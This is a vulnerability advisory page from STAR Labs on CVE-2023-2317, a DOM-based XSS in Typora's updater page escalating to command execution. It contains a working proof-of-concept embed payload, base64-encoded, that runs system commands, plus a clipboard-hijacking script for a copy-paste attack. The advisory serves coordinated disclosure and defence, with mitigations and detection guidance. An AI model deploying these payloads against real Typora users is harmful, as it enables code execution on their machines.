<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product Typora     Vendor Typora   Severity High   Affected Versions Typora for Windows/Linux &lt; 1.6.7   Tested Versions Typora for Windows 1.5.12, Typora for Linux 1.5.10   CVE Identifier CVE-2023-2317   CVE Description DOM-based XSS in updater/update.html in Typora before 1.6.7 on Windows and Linux allows a crafted markdown file to run arbitrary JavaScript code in the context of Typora main window via loading &ldquo;typora://app/typemark/updater/update.">
<meta name="author" content="Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-2317/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution" />
<meta property="og:description" content="Summary:    Product Typora     Vendor Typora   Severity High   Affected Versions Typora for Windows/Linux &lt; 1.6.7   Tested Versions Typora for Windows 1.5.12, Typora for Linux 1.5.10   CVE Identifier CVE-2023-2317   CVE Description DOM-based XSS in updater/update.html in Typora before 1.6.7 on Windows and Linux allows a crafted markdown file to run arbitrary JavaScript code in the context of Typora main window via loading &ldquo;typora://app/typemark/updater/update." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-2317/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-08-19T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-08-19T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution"/>
<meta name="twitter:description" content="Summary:    Product Typora     Vendor Typora   Severity High   Affected Versions Typora for Windows/Linux &lt; 1.6.7   Tested Versions Typora for Windows 1.5.12, Typora for Linux 1.5.10   CVE Identifier CVE-2023-2317   CVE Description DOM-based XSS in updater/update.html in Typora before 1.6.7 on Windows and Linux allows a crafted markdown file to run arbitrary JavaScript code in the context of Typora main window via loading &ldquo;typora://app/typemark/updater/update."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution",
      "item": "https://starlabs.sg/advisories/23/23-2317/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution",
  "name": "(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution",
  "description": "Summary:    Product Typora     Vendor Typora   Severity High   Affected Versions Typora for Windows/Linux \u0026lt; 1.6.7   Tested Versions Typora for Windows 1.5.12, Typora for Linux 1.5.10   CVE Identifier CVE-2023-2317   CVE Description DOM-based XSS in updater/update.html in Typora before 1.6.7 on Windows and Linux allows a crafted markdown file to run arbitrary JavaScript code in the context of Typora main window via loading \u0026ldquo;typora://app/typemark/updater/update.",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product Typora     Vendor Typora   Severity High   Affected Versions Typora for Windows/Linux   Tested Versions Typora for Windows 1.5.12, Typora for Linux 1.5.10   CVE Identifier CVE-2023-2317   CVE Description DOM-based XSS in updater/update.html in Typora before 1.6.7 on Windows and Linux allows a crafted markdown file to run arbitrary JavaScript code in the context of Typora main window via loading “typora://app/typemark/updater/update.html” in  tag. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.   CWE Classification(s) CWE-79 - Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)   CAPEC Classification(s) CAPEC-588 DOM-Based XSS, CAPEC-549 Local Execution of Code    CVSS3.1 Scoring System: Base Score: 8.6 (High)\nVector String: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Local   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) Required   Scope (S) Changed   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Product Overview: Typora is a popular cross-platform markdown editor that allows users to create and edit markdown files with a real-time preview feature. It supports various formatting options such as headings, bold, italics, and more. Typora also allows users to export their markdown files to different formats such as PDF, HTML, and Word.\nTypora for Windows/Linux is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding external webpages. An attacker can use the vulnerability to execute arbitrary JavaScript code and system commands by loading a crafted URL in the markdown editor.\nVulnerability Summary: There is a DOM-based XSS in Typora for Windows/Linux, allowing arbitrary JavaScript code to run in the context of Typora main window. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.\nVulnerability Details: An DOM-based XSS has been found in Typora/resources/updater/updater.html:\ndiv class=\"btn-group\" div id=\"skip-this-version-btn-group\" style=\"flex-grow: 2; min-height: 10px;min-width: 10px;\" button onClick=\"onSkipUpdate()\" data-label=\"1\" Skip This Versionbutton div button onClick=\"onCancelUpdate()\" data-label=\"2\" Remind Me Laterbutton button class=\"btn-primary\" onClick=\"onDownloadUpdate()\" data-label=\"3\" Download Updatebutton div script type=\"text/javascript\" // ...  var labels = JSON.parse(decodeURIComponent(/[?\u0026]labels=([^\u0026]+)/.exec(window.location.search)[1])); // [1]  document.querySelector(\"#sum\").innerText = labels[4] + \" \" + labels[5].replace(\"$1\", newVersion).replace(\"$2\", curVersion); document.querySelectorAll(\"[data-label]\").forEach(function(dom){ dom.innerHTML = labels[dom.getAttribute(\"data-label\") - 0]; // [2]  }); // ...  script In the code snippet above, variable labels is extracted from location.search at [1], and later assigned to innerHTML of elements with data-label attributes at [2].\nHere is a PoC injecting an  tag into the DOM:\nupdater.html?curVersion=1\u0026newVersion=2\u0026releaseNoteLink=3\u0026hideAutoUpdates=false\u0026labels=[\"\",\"22\",\"33\",\"44\",\"55\",\"66\",\"77\"] Typora registered a file handler typora:// to load local resources. For example, the URL of the main window is typora://app/typemark/window.html, and the actual file is loaded from [Typora Installation Absolute Path]/resources/window.html.\nIt is possible for attacker to load the vulnerable updater.html inside an  tag by setting the src attribute to typora://app/typemark/updater/updater.html. In this case, typora://app/typemark/window.html loaded in the main window, and the embedded updater page, are considered same-origin. Thus, updater is able to access privileged interfaces exposed to the main window, such as reqnode.\nBy embedding an updater.html URL with crafted DOM-XSS payload, an attacker is able to execute arbitrary JavaScript code on the main window. Further more, the attacker can use privileged interface reqnode in main window to gain access to the node module child_process and execute arbitrary system command.\nExploit Conditions: This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file in Typora, or (2) copy text from a malicious webpage and paste it into Typora.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:\nembed src=\"typora://app/typemark/updater/updater.html?curVersion=111\u0026newVersion=222\u0026releaseNoteLink=333\u0026hideAutoUpdates=false\u0026labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p'))%22,%22%22,%22%22,%22%22,%22%22]\"embed The base64-encoded part in the PoC is decoded to the following content:\nreqnode('child_process').exec(({Win32: 'notepad %WINDIR%/win.ini', Linux: 'gnome-calculator -e \"Typora RCE PoC\"'})[navigator.platform.substr(0,5)]) When this PoC is loaded in Typora, it will:\n Load updater.html with DOM-XSS Payload The payload executes JavaScript code on main window Execute system command: notepad on Windows, or gnome-calculator on Linux  Attack Scenario: Scenario 1: Open a malicious markdown file An attacker can inject an embed tag in a markdown file and convince the victim to open it in Typora to trigger the payload.\nWe have attached poc/typora-1.5.12-rce.md with this report for demonstration. Open the file in affected version of Typora to verify this vulnerability.\nHere are GIFs showing this scenario on Windows and Ubuntu:\nScenario 2: Copy and paste from a webpage An attacker can craft a malicious webpage and hook on the copy event with the following code:\nscript document.addEventListener('copy',e={ e.preventDefault(); let payload = atob('JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7'); e.clipboardData.setData('text/markhtml', `\\x20\\x0d\\x0a\\x0d\\x0a` + payload + window.getSelection()); console.log(payload + window.getSelection()) }) script When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Typora.\nWe have attached poc/rce-cp.html as PoC of this scenario. A live version can also be found here.\nAdditional Notes:  It is possible for attackers to set custom styles on the  tag to make the exploit less noticeable. For instance, height:0; is used in the Scenario 2 PoC to hide the embedded webpage.  Suggested Mitigations: It is recommended to update HTML elements by setting innerText instead of innerHTML.\nFor end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file should not be opened in Typora, and (2) copying text from an untrusted webpage then pasting it into Typora should be avoided.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by checking the presence of embed tags loading suspicious URLs in markdown files.\nCredits: Li Jiantao (@CurseRed) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline:  2023-04-27 Vendor Disclosure 2023-05-22 Vendor Patch Release 2023-08-19 Public Release  ",
  "wordCount" : "957",
  "inLanguage": "en",
  "datePublished": "2023-08-19T00:00:00Z",
  "dateModified": "2023-08-19T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-2317/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution
    </h1>
    <div class="post-meta"><span title='2023-08-19 00:00:00 +0000 UTC'>August 19, 2023</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#product-overview" aria-label="Product Overview:">Product Overview:</a></li>
                <li>
                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary:">Vulnerability Summary:</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#attack-scenario" aria-label="Attack Scenario:">Attack Scenario:</a><ul>
                        
                <li>
                    <a href="#scenario-1-open-a-malicious-markdown-file" aria-label="Scenario 1: Open a malicious markdown file">Scenario 1: Open a malicious markdown file</a></li>
                <li>
                    <a href="#scenario-2-copy-and-paste-from-a-webpage" aria-label="Scenario 2: Copy and paste from a webpage">Scenario 2: Copy and paste from a webpage</a></li>
                <li>
                    <a href="#additional-notes" aria-label="Additional Notes:">Additional Notes:</a></li></ul>
                </li>
                <li>
                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations:">Suggested Mitigations:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
                <li>
                    <a href="#credits" aria-label="Credits:">Credits:</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline:">Timeline:</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Typora</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Typora</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Typora for Windows/Linux &lt; 1.6.7</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Typora for Windows 1.5.12, Typora for Linux 1.5.10</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-2317</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>DOM-based XSS in updater/update.html in Typora before 1.6.7 on Windows and Linux allows a crafted markdown file to run arbitrary JavaScript code in the context of Typora main window via loading &ldquo;typora://app/typemark/updater/update.html&rdquo; in &lt;embed&gt; tag. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-79 - Improper Neutralization of Input During Web Page Generation (&lsquo;Cross-site Scripting&rsquo;)</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-588 DOM-Based XSS, CAPEC-549 Local Execution of Code</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 8.6 (High)<br>
<strong>Vector String:</strong> <code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Local</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>Required</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Changed</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="product-overview">Product Overview:<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
<p>Typora is a popular cross-platform markdown editor that allows users to create and edit markdown files with a real-time preview feature. It supports various formatting options such as headings, bold, italics, and more. Typora also allows users to export their markdown files to different formats such as PDF, HTML, and Word.</p>
<p>Typora for Windows/Linux is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding external webpages. An attacker can use the vulnerability to execute arbitrary JavaScript code and system commands by loading a crafted URL in the markdown editor.</p>
<h2 id="vulnerability-summary">Vulnerability Summary:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
<p>There is a DOM-based XSS in Typora for Windows/Linux, allowing arbitrary JavaScript code to run in the context of Typora main window. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.</p>
<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>An DOM-based XSS has been found in <code>Typora/resources/updater/updater.html</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn-group&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;skip-this-version-btn-group&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;flex-grow: 2; min-height: 10px;min-width: 10px;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">onClick</span><span class="o">=</span><span class="s">&#34;onSkipUpdate()&#34;</span> <span class="na">data-label</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">&gt;</span>Skip This Version<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">button</span> <span class="na">onClick</span><span class="o">=</span><span class="s">&#34;onCancelUpdate()&#34;</span> <span class="na">data-label</span><span class="o">=</span><span class="s">&#34;2&#34;</span> <span class="p">&gt;</span>Remind Me Later<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn-primary&#34;</span> <span class="na">onClick</span><span class="o">=</span><span class="s">&#34;onDownloadUpdate()&#34;</span> <span class="na">data-label</span><span class="o">=</span><span class="s">&#34;3&#34;</span> <span class="p">&gt;</span>Download Update<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="kd">var</span> <span class="nx">labels</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="sr">/[?&amp;]labels=([^&amp;]+)/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)[</span><span class="mi">1</span><span class="p">]));</span>        <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;#sum&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">labels</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="nx">labels</span><span class="p">[</span><span class="mi">5</span><span class="p">].</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;$1&#34;</span><span class="p">,</span> <span class="nx">newVersion</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;$2&#34;</span><span class="p">,</span> <span class="nx">curVersion</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s2">&#34;[data-label]&#34;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">dom</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dom</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">labels</span><span class="p">[</span><span class="nx">dom</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">&#34;data-label&#34;</span><span class="p">)</span> <span class="o">-</span> <span class="mi">0</span><span class="p">];</span>     <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>In the code snippet above, variable <code>labels</code> is extracted from <code>location.search</code> at <code>[1]</code>, and later assigned to <code>innerHTML</code> of elements with <code>data-label</code> attributes at <code>[2]</code>.</p>
<p>Here is a PoC injecting an <code>&lt;input&gt;</code> tag into the DOM:</p>
<pre tabindex="0"><code>updater.html?curVersion=1&amp;newVersion=2&amp;releaseNoteLink=3&amp;hideAutoUpdates=false&amp;labels=[&#34;&lt;input%20value=test&gt;&#34;,&#34;22&#34;,&#34;33&#34;,&#34;44&#34;,&#34;55&#34;,&#34;66&#34;,&#34;77&#34;]
</code></pre><p><img loading="lazy" src="/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png" alt=""  />
</p>
<p>Typora registered a file handler <code>typora://</code> to load local resources. For example, the URL of the main window is <code>typora://app/typemark/window.html</code>, and the actual file is loaded from <code>[Typora Installation Absolute Path]/resources/window.html</code>.</p>
<p>It is possible for attacker to load the vulnerable updater.html inside an <code>&lt;embed&gt;</code> tag by setting the <code>src</code> attribute to <code>typora://app/typemark/updater/updater.html</code>. In this case, <code>typora://app/typemark/window.html</code> loaded in the main window, and the embedded updater page, are considered same-origin. Thus, updater is able to access privileged interfaces exposed to the main window, such as <code>reqnode</code>.</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png" alt=""  />
</p>
<p>By embedding an updater.html URL with crafted DOM-XSS payload, an attacker is able to execute arbitrary JavaScript code on the main window. Further more, the attacker can use privileged interface <code>reqnode</code> in main window to gain access to the node module <code>child_process</code> and execute arbitrary system command.</p>
<h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file in Typora, or (2) copy text from a malicious webpage and paste it into Typora.</p>
<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">embed</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">embed</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>The base64-encoded part in the PoC is decoded to the following content:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">reqnode</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(({</span><span class="nx">Win32</span><span class="o">:</span> <span class="s1">&#39;notepad %WINDIR%/win.ini&#39;</span><span class="p">,</span> <span class="nx">Linux</span><span class="o">:</span> <span class="s1">&#39;gnome-calculator -e &#34;Typora RCE PoC&#34;&#39;</span><span class="p">})[</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">platform</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">)])</span>
</span></span></code></pre></div><p>When this PoC is loaded in Typora, it will:</p>
<ol>
<li>Load updater.html with DOM-XSS Payload</li>
<li>The payload executes JavaScript code on main window</li>
<li>Execute system command: <code>notepad</code> on Windows, or <code>gnome-calculator</code> on Linux</li>
</ol>
<h2 id="attack-scenario">Attack Scenario:<a hidden class="anchor" aria-hidden="true" href="#attack-scenario">#</a></h2>
<h3 id="scenario-1-open-a-malicious-markdown-file">Scenario 1: Open a malicious markdown file<a hidden class="anchor" aria-hidden="true" href="#scenario-1-open-a-malicious-markdown-file">#</a></h3>
<p>An attacker can inject an embed tag in a markdown file and convince the victim to open it in Typora to trigger the payload.</p>
<p>We have attached <code>poc/typora-1.5.12-rce.md</code> with this report for demonstration. Open the file in affected version of Typora to verify this vulnerability.</p>
<p>Here are GIFs showing this scenario on Windows and Ubuntu:</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif" alt=""  />
</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif" alt=""  />
</p>
<h3 id="scenario-2-copy-and-paste-from-a-webpage">Scenario 2: Copy and paste from a webpage<a hidden class="anchor" aria-hidden="true" href="#scenario-2-copy-and-paste-from-a-webpage">#</a></h3>
